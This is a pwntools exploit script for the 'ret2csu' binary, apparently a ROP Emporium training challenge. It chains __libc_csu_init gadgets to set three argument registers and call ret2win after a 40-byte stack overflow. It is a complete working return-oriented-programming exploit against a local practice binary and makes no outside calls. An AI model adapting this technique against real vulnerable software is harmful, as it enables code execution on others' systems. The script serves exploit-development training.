from pwn import *

binary = "ret2csu"

lib = ELF("./libret2csu.so")
elf = ELF("./"+binary)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pwnme_plt = elf.plt["pwnme"]
ret2win_plt = elf.plt["ret2win"]

log.info("pwnme_plt: " + hex(pwnme_plt))
log.info("ret2win_plt: " + hex(ret2win_plt))


arg1 = pack(0xdeadbeefdeadbeef, 64)
arg2 = pack(0xcafebabecafebabe, 64)
arg3 = pack(0xd00df00dd00df00d, 64)

p = process([binary])


binary_load_adr = 0x400000
lib_csu_adr = 0x0000000000400640
libc_csu_gadget_1 = pack(lib_csu_adr + 90, 64)
libc_csu_gadget_2 = pack(0x0000000000400680, 64)

data_segment_adr = 0x0000000000601028

# rdi rsi rdx


# 0x00000000004006a3 : pop rdi ; ret
pop_rdi_gadget = pack(0x00000000004006a3, 64)

# 0x00000000004004e6 : ret
ret_gadget = pack(0x00000000004004e6, 64)


def write_to_adr(adr, value):
    # 0x00000000004005e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
    add_val_to_adr_gadget = pack(0x00000000004005e8, 64)
    chain = b""
    chain += libc_csu_gadget_1
    chain += value  # rbx -> value
    chain += pack(adr+0x3d, 64)  # rbp -> adr
    chain += b"B"*8  # r12 -> target adr
    chain += b"C"*8  # r13 -> rdi
    chain += b"D"*8  # r14 -> rsi
    chain += b"E"*8  # r15
    chain += add_val_to_adr_gadget
    return chain


chain = b""
chain += write_to_adr(data_segment_adr, ret_gadget)
chain += libc_csu_gadget_1
#    0x000000000040069a <+90>:    pop    rbx
#    0x000000000040069b <+91>:    pop    rbp
#    0x000000000040069c <+92>:    pop    r12
#    0x000000000040069e <+94>:    pop    r13
#    0x00000000004006a0 <+96>:    pop    r14
#    0x00000000004006a2 <+98>:    pop    r15
#    0x00000000004006a4 <+100>:   ret
chain += pack(0, 64)                # rbx
chain += pack(1, 64)                # rbp
chain += pack(data_segment_adr, 64) # r12 -> target adr
chain += arg1                       # r13 -> rdi
chain += arg2                       # r14 -> rsi
chain += arg3                       # r15 -> rdx
chain += libc_csu_gadget_2
# padding for pops, so our rest of chain does not get destroyed
chain += b"X"*8
chain += b"Y"*8
chain += b"Z"*8
chain += b"A"*8
chain += b"B"*8
chain += b"C"*8
chain += b"D"*8
chain += pop_rdi_gadget
chain += arg1
chain += pack(ret2win_plt, 64)
# mov rdx, r15
# mov rsi, r14
# mov edi, r13d
# call qword [r12 + rbx*8]
chain += b"B"*8


r = p.recv().decode("utf-8")
log.info(f"r: {r}")


payload = b""
payload += b"A"*40
payload += chain

log.info(f"payload: {payload}")
write("/tmp/docgil", payload)


# input("before first payload send")
p.send(payload)


# thank you!
r = p.recvall()
log.info(f"r: {r}")

